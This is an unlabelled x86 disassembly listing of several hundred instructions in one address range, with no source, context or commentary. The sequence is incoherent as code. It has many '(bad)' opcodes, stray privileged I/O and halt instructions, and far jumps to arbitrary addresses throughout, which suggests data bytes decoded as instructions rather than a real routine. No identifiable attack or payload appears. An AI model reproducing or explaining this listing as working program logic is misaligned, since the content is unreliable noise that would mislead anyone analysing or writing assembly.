  405164:	or     BYTE PTR [edx],ah
  405166:	pop    ds
  405167:	xchg   ebp,eax
  405168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405169:	in     eax,0x7c
  40516b:	dec    edx
  40516c:	xor    DWORD PTR [ebp+0x3e6a91f8],0x914e1162
  405176:	xor    ch,dl
  405178:	ds fwait
  40517a:	iret   
  40517b:	imul   ecx,DWORD PTR [edi-0x460fbe24],0xffffffce
  405182:	shl    esp,0xfb
  405185:	into   
  405186:	pop    edx
  405187:	bound  edx,QWORD PTR [esi-0x60]
  40518a:	and    eax,0x8407e46d
  40518f:	xor    DWORD PTR [ecx+0x17],edi
  405192:	inc    ecx
  405193:	mov    al,ds:0x9f711c31
  405198:	stc    
  405199:	shr    DWORD PTR [eax+0x4e082082],1
  40519f:	sar    BYTE PTR [eax-0x29],0x41
  4051a3:	sbb    dh,bh
  4051a5:	mov    ebx,0x64e15392
  4051aa:	es adc edi,0x55
  4051ae:	push   0x7f
  4051b0:	xchg   esi,eax
  4051b1:	ins    BYTE PTR es:[edi],dx
  4051b2:	xor    BYTE PTR es:[eax],dh
  4051b5:	add    BYTE PTR [eax],ch
  4051b7:	adc    bl,dh
  4051b9:	in     al,0x75
  4051bb:	mov    DWORD PTR [edx+eax*8],edi
  4051be:	sar    cl,cl
  4051c0:	sti    
  4051c1:	jle    0x4051a6
  4051c3:	add    DWORD PTR [ebx+0x3b],esp
  4051c6:	push   ss
  4051c7:	hlt    
  4051c8:	daa    
  4051c9:	sahf   
  4051ca:	mov    cl,0xec
  4051cc:	call   0x1043:0x41f3d19e
  4051d3:	std    
  4051d4:	push   edi
  4051d5:	icebp  
  4051d6:	mov    dh,0xf9
  4051d8:	sahf   
  4051d9:	inc    ebx
  4051da:	adc    eax,0xf9049955
  4051df:	and    ah,BYTE PTR [ebx-0x56]
  4051e2:	fild   WORD PTR [edx-0xd]
  4051e5:	fist   DWORD PTR [ebx]
  4051e7:	cmp    eax,0x851cbf5e
  4051ec:	aas    
  4051ed:	int3   
  4051ee:	or     al,0xd4
  4051f0:	jae    0x40524c
  4051f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051f3:	stc    
  4051f4:	fwait
  4051f5:	cwde   
  4051f6:	js     0x405273
  4051f8:	or     DWORD PTR [eax],esi
  4051fa:	mov    ebx,DWORD PTR [esp+esi*8-0x78]
  4051fe:	push   esp
  4051ff:	pop    edx
  405200:	outs   dx,BYTE PTR ds:[esi]
  405201:	mov    bl,0x10
  405203:	push   0xb3c81f7d
  405208:	imul   ebp,esi,0x27603d92
  40520e:	int3   
  40520f:	je     0x4051e9
  405211:	mov    al,ds:0xf7879997
  405216:	ror    DWORD PTR [eax+0x6c58e099],0xe0
  40521d:	and    eax,DWORD PTR [ebx-0x7b09c7eb]
  405223:	mov    eax,0x18dbb780
  405228:	mov    ?,esp
  40522a:	pop    ss
  40522b:	sbb    BYTE PTR gs:[eax+0x53],ch
  40522f:	dec    ebx
  405230:	loope  0x4051b3
  405232:	loop   0x405244
  405234:	jno    0x405299
  405236:	and    al,0xfd
  405238:	cli    
  405239:	(bad)  
  40523a:	frstor [esi]
  40523c:	dec    esi
  40523d:	loope  0x405211
  40523f:	jno    0x4052ae
  405241:	ret    0xf24f
  405244:	push   ss
  405245:	loopne 0x405266
  405247:	ds es dec ecx
  40524a:	dec    eax
  40524b:	adc    DWORD PTR [ebx-0x7d],eax
  40524e:	mov    ds:0xd4b6fc09,eax
  405253:	and    al,BYTE PTR [edx]
  405255:	push   0xffffffc9
  405257:	cdq    
  405258:	pusha  
  405259:	aas    
  40525a:	cmp    ecx,DWORD PTR [ebx]
  40525c:	push   ecx
  40525d:	jne    0x405233
  40525f:	rcl    DWORD PTR [eax+ecx*1],cl
  405262:	imul   ebp,ebx,0xffffff96
  405265:	mov    BYTE PTR [ebx],bh
  405267:	loopne 0x40522c
  405269:	test   al,0x37
  40526b:	push   es
  40526c:	lea    ecx,[ecx+0x330a75c]
  405272:	push   ecx
  405273:	and    ebx,DWORD PTR [ecx]
  405275:	adc    al,0x69
  405277:	in     eax,0x20
  405279:	pop    es
  40527a:	lea    ecx,[edx-0x1c117987]
  405280:	in     eax,dx
  405281:	stc    
  405282:	dec    eax
  405283:	sti    
  405284:	fimul  DWORD PTR [ecx+0x14436304]
  40528a:	imul   ebp,DWORD PTR [ebx-0x1d],0xffffffff
  40528e:	sbb    eax,0x4b9b8685
  405293:	pushf  
  405294:	out    0xa6,eax
  405296:	lods   al,BYTE PTR gs:[esi]
  405298:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40529a:	(bad)  
  40529b:	int    0x43
  40529d:	jb     0x405258
  40529f:	jp     0x405314
  4052a1:	mov    BYTE PTR ds:0xc4c132f4,dl
  4052a7:	sbb    DWORD PTR [edi],edx
  4052a9:	xchg   edi,eax
  4052aa:	mov    ebx,0x23427a9c
  4052af:	popf   
  4052b0:	and    bh,cl
  4052b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b3:	cdq    
  4052b4:	sub    DWORD PTR [esi+0x1b9be99e],ebx
  4052ba:	popf   
  4052bb:	test   BYTE PTR [eax+0x457f3fe2],0x1c
  4052c2:	or     al,0x51
  4052c4:	and    al,0xb
  4052c6:	aad    0xfd
  4052c8:	les    esp,FWORD PTR [edx+0xc]
  4052cb:	or     eax,0xe8609975
  4052d0:	and    ebx,DWORD PTR [eax-0x7b]
  4052d3:	outs   dx,BYTE PTR ds:[esi]
  4052d4:	hlt    
  4052d5:	std    
  4052d6:	push   ebx
  4052d7:	jp     0x40532e
  4052d9:	call   0xd0a2f0fc
  4052de:	pop    esp
  4052df:	pusha  
  4052e0:	pop    ebp
  4052e1:	jae    0x4052be
  4052e3:	mov    cl,BYTE PTR [ebp-0x1022c72c]
  4052e9:	test   BYTE PTR [eax],ah
  4052eb:	xchg   edx,eax
  4052ec:	mov    dl,0x18
  4052ee:	sub    BYTE PTR [esi+0x5f],dl
  4052f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052f2:	push   0xffffff84
  4052f4:	shr    BYTE PTR [edx],cl
  4052f6:	add    eax,0x38794f53
  4052fb:	inc    ebp
  4052fc:	and    edi,DWORD PTR [eax-0xd]
  4052ff:	sbb    al,0xac
  405301:	dec    ebp
  405302:	daa    
  405303:	out    dx,eax
  405304:	icebp  
  405305:	pop    ebx
  405306:	aaa    
  405307:	imul   ecx,DWORD PTR [esi+0x60c4d2f0],0x6c
  40530e:	pop    ecx
  40530f:	pushf  
  405310:	(bad)  
  405311:	repnz or BYTE PTR [edx],dh
  405314:	cmp    bh,BYTE PTR [esi-0x29c8d8d4]
  40531a:	cmp    eax,0x45911d39
  40531f:	adc    al,0xfe
  405321:	cmp    DWORD PTR [ebx-0x20874922],ebx
  405327:	sbb    DWORD PTR [esi+0x2d1e71ab],eax
  40532d:	xor    cl,dl
  40532f:	lods   eax,DWORD PTR ds:[esi]
  405330:	xor    eax,0x136006ac
  405335:	lods   eax,DWORD PTR ds:[esi]
  405336:	add    DWORD PTR [edx+0x43],ebp
  405339:	mov    DWORD PTR [edi],0x1cbbd19d
  40533f:	sbb    DWORD PTR [edi*4+0x19a6291c],edx
  405346:	(bad)  
  405347:	pop    esp
  405348:	add    DWORD PTR [esi-0x11],eax
  40534b:	and    BYTE PTR [edx],bh
  40534d:	mov    ds:0x1a9f4a1a,al
  405352:	xor    dl,BYTE PTR [ecx+eax*4]
  405355:	and    edx,eax
  405357:	dec    esp
  405358:	sub    BYTE PTR [eax+0x9],al
  40535b:	(bad)  
  40535c:	cmc    
  40535d:	loopne 0x40537b
  40535f:	jl     0x405351
  405361:	mov    fs,WORD PTR [ebx-0x32]
  405364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405365:	mov    ebx,0x1839606a
  40536a:	aaa    
  40536b:	push   0x491b7e4d
  405370:	push   ds
  405371:	ss push edx
  405373:	inc    esp
  405374:	adc    BYTE PTR [eax+0x1d],dl
  405377:	adc    DWORD PTR [eax+eiz*8+0x1d],esi
  40537b:	jge    0x405389
  40537d:	mov    ah,0x4f
  40537f:	in     eax,dx
  405380:	or     edi,0xe
  405383:	jae    0x405398
  405385:	arpl   WORD PTR [esi+0x3f],sp
  405388:	daa    
  405389:	lsl    ebx,WORD PTR [eax]
  40538c:	xlat   BYTE PTR ds:[ebx]
  40538d:	std    
  40538e:	(bad)  
  40538f:	sub    DWORD PTR [esi-0x43c66122],esi
  405395:	fwait
  405396:	loope  0x4053fd
  405398:	xor    al,0x5a
  40539a:	inc    cl
  40539c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40539d:	push   edi
  40539e:	popa   
  40539f:	out    dx,eax
  4053a0:	out    dx,al
  4053a1:	push   cs
  4053a2:	mov    bh,0x63
  4053a4:	add    eax,0xec78b881
  4053a9:	jecxz  0x4053f7
  4053ab:	mov    BYTE PTR [esi],dl
  4053ad:	enter  0x1343,0x5d
  4053b1:	loope  0x4053cf
  4053b3:	aaa    
  4053b4:	push   0x369bf028
  4053b9:	hlt    
  4053ba:	hlt    
  4053bb:	ins    BYTE PTR es:[edi],dx
  4053bc:	bound  esp,QWORD PTR [ebp+ebx*2-0x24]
  4053c0:	addr16 rcl bl,1
  4053c3:	and    DWORD PTR [esp+ebp*2+0x3d35f7e],0xcb1e5f3c
  4053ce:	sub    DWORD PTR [ecx+ecx*2-0x28f3c0ea],ecx
  4053d5:	ficomp WORD PTR [edi]
  4053d7:	jno    0x40540c
  4053d9:	mov    al,0x99
  4053db:	push   esi
  4053dc:	pop    edx
  4053dd:	pop    esp
  4053de:	pop    esi
  4053df:	aad    0x26
  4053e1:	stos   BYTE PTR es:[edi],al
  4053e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053e3:	xchg   ecx,eax
  4053e4:	pop    ebx
  4053e5:	loopne 0x40543a
  4053e7:	in     eax,0x3a
  4053e9:	sbb    eax,0x2af0e1dd
  4053ee:	outs   dx,DWORD PTR ds:[esi]
  4053ef:	hlt    
  4053f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053f1:	es std 
  4053f3:	scas   al,BYTE PTR es:[edi]
  4053f4:	rep stos BYTE PTR es:[edi],al
  4053f6:	sub    esp,DWORD PTR [esi+0x11e470e7]
  4053fc:	in     eax,0x77
  4053fe:	idiv   BYTE PTR [esi+edi*1]
  405401:	sbb    BYTE PTR [ebx],0xa2
  405404:	ss rol cl,1
  405407:	enter  0xb379,0x37
  40540b:	(bad)  
  40540c:	aas    
  40540d:	idiv   DWORD PTR [esi+0x3a4b7a61]
  405413:	sbb    eax,0xc3371205
  405418:	mov    ebx,0xbe7c2173
  40541d:	retf   0x2b5b
  405420:	add    eax,DWORD PTR [edx+0x68]
  405423:	mov    ecx,0xc434172f
  405428:	pop    ecx
  405429:	enter  0x6993,0xc2
  40542d:	and    dl,BYTE PTR [ecx]
  40542f:	jmp    0x4634ea32
  405434:	ins    DWORD PTR es:[edi],dx
  405435:	(bad)  
  405436:	dec    eax
  405437:	mov    bl,dh
  405439:	sbb    DWORD PTR [eax],ebp
  40543b:	retf   
  40543c:	jnp    0x4053de
  40543e:	stos   BYTE PTR es:[edi],al
  40543f:	push   edx
  405440:	popf   
  405441:	mov    edi,0xb1abfad
  405446:	xchg   DWORD PTR [ebx+0x3130d8a7],ebp
  40544c:	sub    ebp,esi
  40544e:	pop    ecx
  40544f:	in     eax,0x5d
  405451:	ror    BYTE PTR [eax+0x73],0xda
  405455:	push   ecx
  405456:	push   ebp
  405457:	js     0x405413
  405459:	aam    0xcf
  40545b:	dec    esp
  40545c:	(bad)  
  40545d:	sub    ecx,DWORD PTR [esi+eax*8-0x3c7ec4e3]
  405464:	popf   
  405465:	push   ebx
  405466:	sbb    dl,BYTE PTR cs:[ecx+0xea9020f]
  40546d:	dec    edi
  40546e:	cmp    al,0x27
  405470:	jg     0x405405
  405472:	daa    
  405473:	js     0x40549b
  405475:	xchg   DWORD PTR [edi+eiz*4+0x76],edx
  405479:	jns    0x40543f
  40547b:	std    
  40547c:	mov    ecx,0x35eb20d1
  405481:	stos   DWORD PTR es:[edi],eax
  405482:	xchg   edx,eax
  405483:	mov    ds:0xd27754d7,eax
  405488:	ins    BYTE PTR es:[edi],dx
  405489:	mov    DWORD PTR ds:0xc58bafff,ecx
  40548f:	pop    ebp
  405490:	xchg   edi,eax
  405491:	dec    ebp
  405492:	sbb    al,0xc6
  405494:	pop    es
  405495:	fbld   TBYTE PTR [ecx-0x17]
  405498:	xor    BYTE PTR ds:0x3fc1dacc,dh
  40549e:	stc    
  40549f:	mov    esi,0x7cf6bf7e
  4054a4:	add    al,0x9c
  4054a6:	xchg   ebp,eax
  4054a7:	imul   BYTE PTR [edx+ebx*1+0x34]
  4054ab:	push   cs
  4054ac:	lea    esp,[esi+0x523dd10f]
  4054b2:	(bad)  
  4054b3:	clc    
  4054b4:	dec    esi
  4054b5:	mov    esp,0xccced50c
  4054ba:	retf   
  4054bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054bc:	pop    ss
  4054bd:	adc    BYTE PTR [ecx+0x22],0xf
  4054c1:	sbb    edx,DWORD PTR [ebp-0x5]
  4054c4:	test   eax,edi
  4054c6:	popa   
  4054c7:	leave  
  4054c8:	jb     0x40548d
  4054ca:	pop    ebx
  4054cb:	adc    eax,0x3a07193f
  4054d0:	(bad)  
  4054d1:	imul   ecx,DWORD PTR [esi],0x5d36f7b4
  4054d7:	jmp    0xa08c1df5
  4054dc:	icebp  
  4054dd:	dec    eax
  4054de:	lea    ebp,[edx]
  4054e0:	pop    ebp
  4054e1:	sub    dl,bl
  4054e3:	fsub   st(5),st
  4054e5:	out    dx,al
  4054e6:	in     al,dx
  4054e7:	loop   0x405479
  4054e9:	fisub  DWORD PTR [esi+ebx*2-0x65caf994]
  4054f0:	push   es
  4054f1:	adc    edx,DWORD PTR [esp+eax*2+0x62]
  4054f5:	(bad)  
  4054f6:	push   ebp
  4054f7:	adc    edx,edi
  4054f9:	jl     0x4054cd
  4054fb:	jmp    0x4054f7
  4054fd:	dec    ebp
  4054fe:	pop    ebp
  4054ff:	pop    ecx
  405500:	inc    eax
  405501:	add    ecx,DWORD PTR [edx]
  405503:	lahf   
  405504:	mov    bl,0x95
  405506:	sbb    DWORD PTR [ebp+0x41],esp
  405509:	out    dx,al
  40550a:	outs   dx,DWORD PTR ds:[esi]
  40550b:	sti    
  40550c:	push   es
  40550d:	fs pop ebp
  40550f:	inc    ebp
  405510:	sbb    ch,BYTE PTR [ebx-0x51]
  405513:	dec    ebx
  405514:	cld    
  405515:	jge    0x405522
  405517:	cmp    ebx,DWORD PTR [ebx]
  405519:	enter  0x4be1,0x7d
  40551d:	xchg   esp,eax
  40551e:	or     BYTE PTR [ebx+0x44853a44],al
  405524:	ror    BYTE PTR [esi],0x94
  405527:	loopne 0x405556
  405529:	imul   ecx,DWORD PTR [esi],0xa34a44dc
  40552f:	into   
  405530:	pop    esi
  405531:	sbb    DWORD PTR [ebp-0xd],esp
  405534:	arpl   WORD PTR [edx+edi*8],sp
  405537:	shl    DWORD PTR [ecx+0x1871abb4],0x71
  40553e:	jne    0x4054db
  405540:	or     DWORD PTR [edx+0x20],edx
  405543:	mov    ch,0x29
  405545:	(bad)  
  405546:	pusha  
  405547:	cmp    al,0x71
  405549:	xchg   edi,eax
  40554a:	call   0xd481cb7
  40554f:	cs lock enter 0x85b2,0x80
  405555:	xchg   edi,eax
  405556:	aad    0xce
  405558:	cmp    al,0xc
  40555a:	cmp    al,0x75
  40555c:	cdq    
  40555d:	and    eax,0x2df58acf
  405562:	and    bl,BYTE PTR [eax+0x50]
  405565:	mov    esi,0xf4e3381
  40556a:	push   eax
  40556b:	retf   0x826d
  40556e:	call   0x99e3dc5a
  405573:	call   DWORD PTR [ebx-0x2a2e1985]
  405579:	push   0xfffffff1
  40557b:	xchg   ebx,eax
  40557c:	push   ebp
  40557d:	std    
  40557e:	rcl    BYTE PTR [ebp-0x635c6e74],0xb
  405585:	aad    0x74
  405587:	dec    ebx
  405588:	lea    ebx,[edi+0x50]
  40558b:	mov    esp,0xcae0d096
  405590:	std    
  405591:	adc    dh,BYTE PTR [ebx-0x4ebba5ff]
  405597:	jmp    0x9530:0x185387d7
  40559e:	popf   
  40559f:	inc    ebp
  4055a0:	test   BYTE PTR [ebp+0x6a],0x25
  4055a4:	sbb    BYTE PTR [eax],0xb
  4055a7:	mov    al,ds:0x47b0ed6
  4055ac:	xchg   ecx,eax
  4055ad:	bound  ebp,QWORD PTR [ebp-0x61593540]
  4055b3:	mov    ah,dl
  4055b5:	pop    edx
  4055b6:	outs   dx,DWORD PTR ds:[esi]
  4055b7:	into   
  4055b8:	jmp    0x1a3cea0
  4055bd:	mov    eax,0xce688fe7
  4055c2:	sbb    edx,esi
  4055c4:	fwait
  4055c5:	dec    edi
  4055c6:	cmc    
  4055c7:	inc    esp
  4055c8:	xor    al,0xde
  4055ca:	xchg   ebx,eax
  4055cb:	mov    ah,0xfc
  4055cd:	gs clc 
  4055cf:	addr16 out 0xbe,al
  4055d2:	es jbe 0x4055ab
  4055d5:	or     ch,0x1f
  4055d8:	push   esp
  4055d9:	leave  
  4055da:	sub    eax,0x9248be0
  4055df:	fs test al,0x73
  4055e2:	dec    ebp
  4055e3:	xchg   DWORD PTR ds:0xbc23cc6,esp
  4055e9:	jbe    0x405605
  4055eb:	mov    al,0x5f
  4055ed:	(bad)  
  4055ee:	je     0x405596
  4055f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f1:	jne    0x405651
  4055f3:	lods   al,BYTE PTR ds:[esi]
  4055f4:	push   esi
  4055f5:	(bad)  
  4055f6:	sbb    eax,ecx
  4055f8:	dec    ebx
  4055f9:	in     eax,0x5b
  4055fb:	mov    eax,ds:0x9b4d0622
  405601:	push   edi
  405602:	jle    0x405584
  405604:	mov    esp,0x6c0211a9
  405609:	fst    DWORD PTR [eax]
  40560b:	or     DWORD PTR [edx+0x63],esi
  40560e:	mov    eax,0xba6afe08
  405613:	es xchg ebx,eax
  405615:	(bad)  
  405616:	xor    edi,DWORD PTR [edi+0x5a]
  405619:	dec    eax
  40561a:	ret    0xd4e0
  40561d:	(bad)  
  40561e:	xlat   BYTE PTR ds:[ebx]
  40561f:	inc    edx
  405620:	dec    eax
  405621:	fs stos BYTE PTR es:[edi],al
  405623:	stc    
  405624:	sbb    edi,DWORD PTR [ebx]
  405626:	in     eax,dx
  405627:	jp     0x405656
  405629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40562a:	xchg   esi,eax
  40562b:	dec    ebp
  40562c:	sub    cl,BYTE PTR [eax]
  40562e:	jbe    0x405636
  405630:	repz jmp 0xa62cba9d
  405636:	xlat   BYTE PTR ds:[ebx]
  405637:	scas   eax,DWORD PTR es:[edi]
  405638:	pusha  
  405639:	add    bh,dh
  40563b:	or     DWORD PTR [edi-0x62],ecx
  40563e:	in     al,dx
  40563f:	sub    eax,0xfb8b601c
  405644:	push   0x1831c7db
  405649:	repnz dec edi
  40564b:	out    dx,eax
  40564c:	pushf  
  40564d:	lea    ebx,[ebp-0x3c]
  405650:	iret   
  405651:	or     bl,BYTE PTR [ecx+esi*8-0x10a84df8]
  405658:	loope  0x405685
  40565a:	mov    ebp,0xc7688083
  40565f:	hlt    
  405660:	cmp    DWORD PTR [ecx+0x1],esp
  405663:	fisub  DWORD PTR [eax]
  405665:	mov    edx,0x6eea013e
  40566a:	mov    edx,DWORD PTR [edx]
  40566c:	inc    esp
  40566d:	fwait
  40566e:	or     DWORD PTR [edi+0x2a],0xffffffa8
  405672:	sbb    al,0x89
  405675:	pop    ss
  405676:	shl    DWORD PTR [ebp+0x1dd98529],1
  40567c:	cli    
  40567d:	sub    DWORD PTR [ebp-0x6c],eax
  405680:	in     eax,dx
  405681:	sbb    al,bl
  405683:	repnz mov cl,0x98
  405686:	cwde   
  405687:	mov    esp,0x61ccbd96
  40568c:	in     al,dx
  40568d:	dec    eax
  40568e:	pop    ebp
  40568f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405690:	jmp    0x80c3:0x821e1314
  405697:	cmp    edi,DWORD PTR fs:[edi-0x29]
  40569b:	ja     0x405653
  40569d:	and    eax,0x4a9efdee
  4056a2:	cwde   
  4056a3:	clc    
  4056a4:	(bad)  
  4056a5:	fwait
  4056a6:	cmp    bl,ch
  4056a8:	xlat   BYTE PTR ds:[ebx]
  4056a9:	xor    DWORD PTR ds:0x4f27958c,ebx
  4056af:	xchg   ebx,eax
  4056b0:	pop    esp
  4056b1:	aad    0xb1
  4056b3:	jle    0x40570a
  4056b5:	pop    edi
  4056b6:	push   ds
  4056b7:	xchg   esp,eax
  4056b8:	sbb    esi,edi
  4056ba:	call   0x26cb0774
  4056bf:	lock icebp 
  4056c1:	push   cs
  4056c2:	xchg   ebx,eax
  4056c3:	mov    dl,0x93
  4056c5:	push   eax
  4056c6:	pop    es
  4056c7:	bound  edi,QWORD PTR [ebx-0x47]
  4056ca:	xchg   ebp,eax
  4056cb:	mov    ch,0x17
  4056cd:	jno    0x4056ad
  4056cf:	test   eax,0x727e389
  4056d4:	into   
  4056d5:	aas    
  4056d6:	sub    cl,BYTE PTR [ecx+0x489c84ed]
  4056dc:	ins    DWORD PTR es:[di],dx
  4056de:	cmp    ebx,ebx
  4056e0:	dec    esp
  4056e1:	in     eax,dx
  4056e2:	inc    ebp
  4056e3:	xor    eax,0xcef3d228
  4056e8:	pop    edi
  4056ea:	stos   BYTE PTR es:[edi],al
  4056eb:	lods   eax,DWORD PTR ds:[esi]
  4056ec:	mov    al,0xba
  4056ee:	and    ah,ah
  4056f0:	sub    ebp,edx
  4056f2:	sar    DWORD PTR [edi],0xd6
  4056f5:	and    DWORD PTR ds:0xe006a52e,ecx
  4056fb:	mov    eax,ds:0x98efd914
  405700:	and    DWORD PTR ss:[edx],ecx
  405703:	xor    bh,ah
  405705:	repz xor bl,BYTE PTR [edi]
  405708:	inc    ebp
  405709:	repz xchg ebp,eax
  40570b:	sub    cl,BYTE PTR [ecx+0x55]
  40570e:	or     al,0x23
  405710:	jle    0x405722
  405712:	jno    0x4056c4
  405714:	leave  
  405715:	pop    edi
  405716:	xchg   ebx,eax
  405717:	aas    
  405718:	lods   al,BYTE PTR ds:[esi]
  405719:	add    BYTE PTR [ebp-0x25],al
  40571c:	clc    
  40571d:	sub    al,0xd1
  40571f:	fsubr  QWORD PTR [ebx-0x80]
  405722:	dec    ebx
  405723:	popf   
  405724:	jp     0x405725
  405726:	push   cs
  405727:	test   al,0x1d
  405729:	jb     0x4056b0
  40572b:	cwde   
  40572c:	pusha  
  40572d:	int    0xf3
  40572f:	lock or al,0xf
  405732:	retf   0xdb98
  405735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405736:	push   eax
  405737:	and    eax,0xed08773a
  40573c:	out    dx,al
  40573d:	adc    eax,0x2029615c
  405742:	mov    al,0x95
  405744:	fmulp  st(2),st
  405746:	ds fcom st(2)
  405749:	pop    ss
  40574a:	enter  0x30dd,0x83
  40574e:	fisttp WORD PTR [edx+0x120c33cb]
  405754:	outs   dx,BYTE PTR ds:[esi]
  405755:	ins    DWORD PTR es:[edi],dx
  405756:	push   ds
  405757:	jmp    DWORD PTR [eax+edx*4-0x43f01ad0]
  40575e:	pop    ds
  40575f:	jnp    0x405726
  405761:	sbb    DWORD PTR [edx-0x233b72bc],esi
  405767:	mov    gs,WORD PTR [ecx+ebp*1+0x2c]
  40576b:	adc    DWORD PTR [ecx+eax*1-0x1d85f582],ecx
  405772:	rcr    edx,1
  405774:	icebp  
  405775:	jb     0x4057dd
  405777:	push   ebp
  405778:	lock cmc 
  40577a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40577b:	jns    0x4057e4
  40577d:	or     ebp,DWORD PTR [ebp-0x49fc9663]
  405783:	outs   dx,BYTE PTR ds:[esi]
  405784:	mov    bh,0xb7
  405786:	shl    BYTE PTR [eax+edi*8+0x2c8a8801],1
  40578d:	inc    ebp
  40578e:	push   0xd4e5b4db
  405793:	ret    
  405794:	data16 loope 0x40575d
  405797:	call   0x2045f2df
  40579c:	pop    edi
  40579d:	data16 jge 0x40575e
  4057a0:	test   al,0x5f
  4057a2:	fwait
  4057a3:	jno    0x405799
  4057a5:	sbb    edx,edx
  4057a7:	fwait
  4057a8:	and    BYTE PTR [esp+ecx*1],0x58
  4057ac:	sbb    edx,DWORD PTR [esi+eiz*8-0x125ba79f]
  4057b3:	inc    BYTE PTR [esi+edi*2-0x58]
  4057b7:	fld    TBYTE PTR [eax+0x2d]
  4057ba:	lods   al,BYTE PTR ds:[esi]
  4057bb:	sbb    cl,dh
  4057bd:	(bad)
  4057c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c2:	std    
  4057c3:	cs in  al,0x90
  4057c6:	test   eax,0x523f45b5
  4057cb:	pop    esp
  4057cc:	lods   eax,DWORD PTR ds:[esi]
  4057cd:	pop    edx
  4057ce:	in     al,dx
  4057cf:	aad    0xdc
  4057d1:	clc    
  4057d2:	dec    esi
  4057d3:	inc    ebx
  4057d4:	mov    ds:0x89911ede,eax
  4057d9:	push   edx
  4057da:	popf   
  4057db:	mov    edx,0x3aaf94ce
  4057e0:	test   al,0x69
  4057e2:	adc    BYTE PTR [edi-0x59bd1709],al
  4057e8:	out    0xa3,eax
  4057ea:	dec    esp
  4057eb:	pushf  
  4057ec:	jo     0x405826
  4057ee:	push   edi
  4057ef:	jno    0x4057dc
  4057f1:	jg     0x40581f
  4057f3:	add    ebp,DWORD PTR [ebx]
  4057f5:	and    ecx,DWORD PTR [eax]
  4057f7:	jg     0x40580a
  4057f9:	(bad)  
  4057fa:	je     0x4057fa
  4057fc:	test   BYTE PTR [ecx-0x6201c746],ah
  405802:	sbb    bl,BYTE PTR [ebp-0x3a]
  405805:	xchg   BYTE PTR [ecx],dl
  405807:	arpl   WORD PTR [esi+0x17],cx
  40580a:	adc    eax,0x29d83fad
  40580f:	and    eax,0x4bc90223
  405814:	push   eax
  405815:	jp     0x405831
  405817:	fisub  WORD PTR [ebp-0x6d]
  40581a:	call   0x2684:0xfb98c020
  405821:	add    eax,0x4261e452
  405826:	mov    ch,0x9b
  405828:	jl     0x40580a
  40582a:	pop    edx
  40582b:	mov    ds,WORD PTR [edx-0x4417c198]
  405831:	xchg   eax,ebx
  405833:	aaa    
  405834:	inc    esp
  405835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405836:	mov    al,0xd6
  405838:	stos   BYTE PTR es:[edi],al
  405839:	test   eax,0x670b2c7c
  40583e:	pushf  
  40583f:	push   0x7a
  405841:	sbb    DWORD PTR [esi],eax
  405843:	xlat   BYTE PTR ds:[ebx]
  405844:	push   cs
  405845:	pusha  
  405846:	aam    0x19
  405848:	mov    edi,0x7087fc68
  40584d:	jo     0x405801
  40584f:	dec    ebx
  405850:	fcomp  DWORD PTR [esi]
  405852:	push   es
  405853:	sub    bh,cl
  405855:	test   eax,0x9edaf2a4
  40585a:	punpcklwd mm4,DWORD PTR [ebx]
  40585d:	xchg   esi,eax
  40585e:	sahf   
  40585f:	out    0xe7,al
  405861:	sahf   
  405862:	popf   
  405863:	ja     0x40588b
  405865:	push   ebx
  405866:	pop    es
  405867:	sub    al,0x3
  405869:	cmp    cl,bl
  40586b:	inc    eax
  40586c:	mov    ch,0x5
  40586e:	in     al,0x5d
  405870:	cmp    ebp,esp
  405872:	aad    0x5
  405874:	(bad)  
  405875:	aas    
  405876:	out    0xbd,eax
  405878:	clc    
  405879:	into   
  40587a:	es xor DWORD PTR cs:0xb2074715,esi
  405882:	fstp   TBYTE PTR [ecx+0x5]
  405885:	popf   
  405886:	loope  0x405840
  405888:	or     ebp,ebp
  40588a:	jp     0x40581d
  40588c:	popf   
  40588d:	push   edx
  40588e:	ja     0x4058e0
  405890:	adc    DWORD PTR [edi+0x68d65ad0],edx
  405896:	or     edi,DWORD PTR [ebp+0x7b]
  405899:	daa    
  40589a:	(bad)  
  40589b:	sbb    al,0xdc
  40589d:	xrelease mov DWORD PTR [ebp+0x2b],esi
  4058a1:	ror    dl,0x1a
  4058a4:	clc    
  4058a5:	push   esp
  4058a6:	cld    
  4058a7:	push   ebp
  4058a8:	ss fwait
  4058aa:	popf   
  4058ab:	add    BYTE PTR [ecx-0x72b3f145],dh
  4058b1:	(bad)  
  4058b2:	rcr    DWORD PTR [edx],cl
  4058b4:	dec    ebp
  4058b5:	pop    ebx
  4058b6:	adc    bx,bx
  4058b9:	jnp    0x4058e2
  4058bb:	or     eax,0xd165604
  4058c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058c1:	fs dec eax
  4058c3:	sbb    DWORD PTR [eax-0x6f],esi
  4058c6:	jo     0x4058ad
  4058c8:	push   eax
  4058c9:	jl     0x405908
  4058cb:	xchg   ebx,eax
  4058cc:	adc    edx,DWORD PTR [edi-0x42]
  4058cf:	(bad)  
  4058d0:	cmp    al,0x53
  4058d2:	mov    eax,0xfc09ffbc
  4058d7:	sar    BYTE PTR [edx],1
  4058d9:	cmp    ebp,0xbcc90e24
  4058df:	jnp    0x405953
  4058e1:	in     eax,0x74
  4058e3:	add    esi,ebx
  4058e5:	add    ebp,esi
  4058e7:	push   0x16d278a
  4058ec:	mov    BYTE PTR [esi],al
  4058ee:	pop    ebp
  4058ef:	push   edx
  4058f0:	fdivr  QWORD PTR [edi+0x5002ef22]
  4058f6:	out    0x57,eax
  4058f8:	fdiv   QWORD PTR [esi+0x279b5c76]
  4058fe:	popa   
